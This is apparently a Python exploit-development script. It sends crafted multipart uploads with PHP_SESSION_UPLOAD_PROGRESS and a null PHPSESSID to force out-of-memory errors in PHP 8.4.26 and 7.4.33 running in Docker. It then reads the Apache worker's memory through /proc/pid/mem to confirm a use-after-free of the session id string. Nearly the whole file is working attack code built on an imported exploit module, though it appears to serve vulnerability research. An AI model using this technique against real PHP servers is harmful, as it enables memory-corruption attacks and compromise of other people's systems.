"""Read PS(id) on 7.4.33 DURING an OOM (accumulating 1.8MB fields) vs on 8.4.26 (real OOM).
Goal: prove that 8.4.26's OOM leaves PS(id)'s chunk freed (UAF) while 7.4.33's does not.
Read PS(id) pointer + the 16 bytes of the zend_string it points to, right after OOM."""
import sys, os, time, struct, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

def sh(c, cmd):
    r = subprocess.run(["docker","exec",c,"sh","-c",cmd],capture_output=True)
    return r.stdout,r.stderr
def rm(c,w,a,n):
    r=subprocess.run(["docker","exec",c,"sh","-c",f"dd if=/proc/{w}/mem bs=1 skip={a} count={n} 2>/dev/null"],capture_output=True)
    return r.stdout
def wpid(c):
    o,_=sh(c,"ps aux|grep apache2|grep www-data|grep -v grep|awk '{print $2}'|head -1")
    return o.decode().strip()
def base(c,w):
    o,_=sh(c,f"grep libphp /proc/{w}/maps|head -1")
    l=o.decode().strip()
    return int(l.split("-")[0],16) if l else 0

def dump_psid(c,w,b,psg_off,label):
    psg=b+psg_off
    raw=rm(c,w,psg+0x10,8)
    if len(raw)<8: print(f"  {label}: read failed"); return
    ptr=struct.unpack("<Q",raw)[0]
    hdr=rm(c,w,ptr,32) if ptr else b""
    rc,ty,ln=(struct.unpack_from("<H",hdr,0)[0] if len(hdr)>=2 else -1,
               struct.unpack_from("<H",hdr,2)[0] if len(hdr)>=4 else -1,
               struct.unpack_from("<Q",hdr,16)[0] if len(hdr)>=24 else -1)
    print(f"  {label}: PS(id)=0x{ptr:x} rc={rc} type=0x{ty:x} len={ln} data={hdr[24:32].hex() if len(hdr)>=32 else hdr.hex()}",flush=True)

print("=== 8.4.26 (real OOM) ===",flush=True)
w=wpid("p2s8426"); b=base("p2s8426",w)
t=E.Target("http://127.0.0.1:18113/",timeout=90.0,verbose=False)
parts=[{"name":f"p{i:04d}","data":b"x"} for i in range(1001)]
parts+=[{"name":"PHPSESSID","data":b"\x00"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
        {"name":"f","filename":"a.txt","data":b"A"*64},{"name":"big","data":b"B"*(12*1024*1024)}]
resp=t.post(E.build_multipart(parts,b"S"*17),b"S"*17,read_cap=1<<20,timeout=90.0)
print(f"  OOM={b'Fatal' in resp or b'Allowed' in resp}",flush=True)
time.sleep(0.4)
dump_psid("p2s8426",w,b,0x1316820,"post-OOM")

print("\n=== 7.4.33 (accumulated OOM via 1.8MB fields) ===",flush=True)
w=wpid("p2s7433"); b=base("p2s7433",w)
t=E.Target("http://127.0.0.1:18108/",timeout=90.0,verbose=False)
for n in [5,8,12,16]:
    parts=[{"name":f"m{i:04d}","data":b"M"*(int(1.8*1024*1024))} for i in range(n)]
    parts+=[{"name":"PHPSESSID","data":b"\x00"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
            {"name":"f","filename":"a.txt","data":b"A"*64}]
    try:
        resp=t.post(E.build_multipart(parts,b"S"*17),b"S"*17,read_cap=1<<20,timeout=90.0)
        oom = b"Fatal" in resp or b"Allowed" in resp or b"memory" in resp.lower()
    except Exception as e:
        oom = True; resp=b"(exception)"
    time.sleep(0.4)
    dump_psid("p2s7433",w,b,0xd37f80,f"{n}x1.8MB oom={oom}")
    time.sleep(0.3)
